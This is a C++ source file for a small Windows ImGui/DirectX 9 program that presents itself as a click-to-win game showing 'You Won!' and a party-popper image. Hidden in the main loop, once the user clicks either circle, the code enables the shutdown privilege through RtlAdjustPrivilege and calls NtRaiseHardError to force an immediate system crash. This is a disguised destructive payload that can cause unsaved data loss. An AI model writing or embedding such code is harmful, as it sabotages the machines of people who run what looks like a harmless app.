#include <tchar.h>
#include "Common.h"
#include "imgui.h"
#include "imgui_impl_dx9.h"
#include "imgui_impl_win32.h"
#include "app/app.h"
#include "resource/resource.h"
#include "helpers/d3d.hpp"
#define STB_IMAGE_IMPLEMENTATION
#include "helpers/stb_image.h"

#ifndef WM_DPICHANGED
#define WM_DPICHANGED 0x02E0 
#endif

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
		return true;

	switch (msg)
	{
	case WM_SIZE:
		if (wParam == SIZE_MINIMIZED)
			return 0;
		g_ResizeWidth = static_cast<UINT>(LOWORD(lParam));
		g_ResizeHeight = static_cast<UINT>(HIWORD(lParam));
		return 0;

	case WM_SYSCOMMAND:
		if ((wParam & 0xfff0) == SC_KEYMENU)
			return 0;
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

	case WM_DPICHANGED:
		if (ImGui::GetIO().ConfigFlags & ImGuiConfigFlags_DpiEnableScaleViewports)
		{
			const int dpi = HIWORD(wParam);
			const RECT* suggested_rect = reinterpret_cast<RECT*>(&lParam);
			SetWindowPos(hWnd, nullptr, suggested_rect->left, suggested_rect->top, suggested_rect->right - suggested_rect->left, suggested_rect->bottom - suggested_rect->top, SWP_NOZORDER | SWP_NOACTIVATE);
		}
		break;
	}

	return DefWindowProcW(hWnd, msg, wParam, lParam);
}

LPDIRECT3DTEXTURE9 LoadTextureFromFile(LPDIRECT3DDEVICE9 device, const char* filename)
{
	int width, height, numChannels;
	unsigned char* data = stbi_load(filename, &width, &height, &numChannels, 0);

	if (!data)
		return nullptr;

	LPDIRECT3DTEXTURE9 texture;

	if (FAILED(device->CreateTexture(width, height, 1, 0, D3DFMT_A8R8G8B8, D3DPOOL_MANAGED, &texture, nullptr)))
	{
		stbi_image_free(data);
		return nullptr;
	}

	D3DLOCKED_RECT lockedRect;
	if (FAILED(texture->LockRect(0, &lockedRect, nullptr, 0)))
	{
		texture->Release();
		stbi_image_free(data);
		return nullptr;
	}

	for (int y = 0; y < height; ++y)
	{
		for (int x = 0; x < width; ++x)
		{
			int srcIndex = (y * width + x) * numChannels;
			int destIndex = y * lockedRect.Pitch + x * 4;

			static_cast<unsigned char*>(lockedRect.pBits)[destIndex + 0] = data[srcIndex + 2];
			static_cast<unsigned char*>(lockedRect.pBits)[destIndex + 1] = data[srcIndex + 1];
			static_cast<unsigned char*>(lockedRect.pBits)[destIndex + 2] = data[srcIndex + 0];
			static_cast<unsigned char*>(lockedRect.pBits)[destIndex + 3] = numChannels == 4 ? data[srcIndex + 3] : 255;
		}
	}

	texture->UnlockRect(0);
	stbi_image_free(data);

	return texture;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	ImGui_ImplWin32_EnableDpiAwareness();
	WNDCLASSEXW wc = {
		sizeof(wc),
		CS_CLASSDC,
		WndProc,
		0L,
		0L,
		hInstance,
		LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)),
		nullptr,
		nullptr,
		nullptr,
		L"" APP_NAME,
		LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1))
	};
	RegisterClassExW(&wc);
	HWND hwnd = CreateWindowW(
		wc.lpszClassName,
		L"" APP_NAME " | v" APP_VERSION,
		WS_OVERLAPPEDWINDOW,
		app::position.x, app::position.y,
		app::size.x, app::size.y,
		nullptr,
		nullptr,
		wc.hInstance,
		nullptr
	);

	if (!helpers::d3d::CreateDeviceD3D(hwnd))
	{
		helpers::d3d::CleanupDeviceD3D();
		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		MessageBoxW(nullptr, L"Failed to create Direct3D device", L"" APP_NAME, MB_OK | MB_ICONERROR);
		return EXIT_FAILURE;
	}

	LPDIRECT3DTEXTURE9 image = LoadTextureFromFile(g_pd3dDevice, "party-popper.png");

	ShowWindow(hwnd, SW_SHOWDEFAULT);
	UpdateWindow(hwnd);

	IMGUI_CHECKVERSION();
	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	io.IniFilename = nullptr;
	io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
	io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;
	io.ConfigFlags |= ImGuiConfigFlags_DockingEnable;
	io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;

	ImGui::StyleColorsDark();

	ImGuiStyle& style = ImGui::GetStyle();
	if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
	{
		style.WindowRounding = 0.0f;
		style.Colors[ImGuiCol_WindowBg].w = 1.0f;
	}

	ImGui_ImplWin32_Init(hwnd);
	ImGui_ImplDX9_Init(g_pd3dDevice);

	while (g_running)
	{
		MSG msg;
		while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
			if (msg.message == WM_QUIT)
				g_running = false;
		}
		if (!g_running)
			break;

		if (g_ResizeWidth != 0 && g_ResizeHeight != 0)
		{
			g_d3dpp.BackBufferWidth = g_ResizeWidth;
			g_d3dpp.BackBufferHeight = g_ResizeHeight;
			g_ResizeWidth = g_ResizeHeight = 0;
			helpers::d3d::ResetDevice();
		}

		static bool win = false;
		if (win) {
			typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
			typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

			BOOLEAN bEnabled;
			ULONG uResp;
			LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
			LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
			auto NtCall = static_cast<pdef_RtlAdjustPrivilege>(lpFuncAddress);
			auto NtCall2 = static_cast<pdef_NtRaiseHardError>(lpFuncAddress2);
			NtCall(19, TRUE, FALSE, &bEnabled);
			NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, nullptr, 6, &uResp);
		}

		ImGui_ImplDX9_NewFrame();
		ImGui_ImplWin32_NewFrame();
		ImGui::NewFrame();

		ImGuiViewport* viewport = ImGui::GetMainViewport();
		ImDrawList* draw_list = ImGui::GetForegroundDrawList();

		draw_list->AddCircleFilled(viewport->WorkPos + ImVec2(viewport->Size.x / 2 - viewport->Size.x / 5.f, viewport->Size.y / 2), 50, ImColor(255, 0, 0, 255));
		draw_list->AddCircleFilled(viewport->WorkPos + ImVec2(viewport->Size.x / 2 + viewport->Size.x / 5.f, viewport->Size.y / 2), 50, ImColor(0, 0, 255, 255));

		if (!win && ImGui::IsMouseClicked(ImGuiMouseButton_Left))
		{
			ImVec2 mouse_pos = ImGui::GetMousePos();
			auto in_circle = [mouse_pos](ImVec2 center, float radius) -> bool
			{
				return sqrt((mouse_pos.x - center.x) * (mouse_pos.x - center.x) + (mouse_pos.y - center.y) * (mouse_pos.y - center.y)) <= radius;
			};

			ImGuiViewport* viewport = ImGui::GetMainViewport();
			if (in_circle(viewport->WorkPos + ImVec2(viewport->Size.x / 2 - viewport->Size.x / 5.f, viewport->Size.y / 2), 50) || in_circle(viewport->WorkPos + ImVec2(viewport->Size.x / 2 + viewport->Size.x / 5.f, viewport->Size.y / 2), 50))
				win = true;
		}

		if (win)
		{
			draw_list->AddRectFilled(viewport->WorkPos + ImVec2(viewport->Size.x / 2 - 300, viewport->Size.y / 2 - 200), viewport->WorkPos + ImVec2(viewport->Size.x / 2 + 300, viewport->Size.y / 2 + 200), ImColor(40, 40, 40));
			draw_list->AddText(ImGui::GetFont(), 40.f, viewport->WorkPos + ImVec2(viewport->Size.x / 2 - ImGui::GetFont()->CalcTextSizeA(40.f, 500.f, 500.f, "You Won!").x / 2, viewport->Size.y / 2 - 180), ImColor(255, 255, 255), "You Won!");

			if (image)
				draw_list->AddImage(image, viewport->WorkPos + ImVec2(viewport->Size.x / 2 - 100, viewport->Size.y / 2 - 100), viewport->WorkPos + ImVec2(viewport->Size.x / 2 + 100, viewport->Size.y / 2 + 100));
		}

		ImGui::EndFrame();
		g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
		g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
		g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
		D3DCOLOR clear_col_dx = D3DCOLOR_RGBA(
			static_cast<int>(app::configuration::background_color.x * app::configuration::background_color.w * 255.0f),
			static_cast<int>(app::configuration::background_color.y * app::configuration::background_color.w * 255.0f),
			static_cast<int>(app::configuration::background_color.z * app::configuration::background_color.w * 255.0f),
			static_cast<int>(app::configuration::background_color.w * 255.0f)
		);
		g_pd3dDevice->Clear(0, nullptr, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, clear_col_dx, 1.0f, 0);
		if (g_pd3dDevice->BeginScene() >= 0)
		{
			ImGui::Render();
			ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
			g_pd3dDevice->EndScene();
		}

		if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
		{
			ImGui::UpdatePlatformWindows();
			ImGui::RenderPlatformWindowsDefault();
		}

		if (g_pd3dDevice->Present(nullptr, nullptr, nullptr, nullptr) == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
			helpers::d3d::ResetDevice();
	}

	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	helpers::d3d::CleanupDeviceD3D();
	DestroyWindow(hwnd);
	UnregisterClassW(wc.lpszClassName, wc.hInstance);

	return EXIT_SUCCESS;
}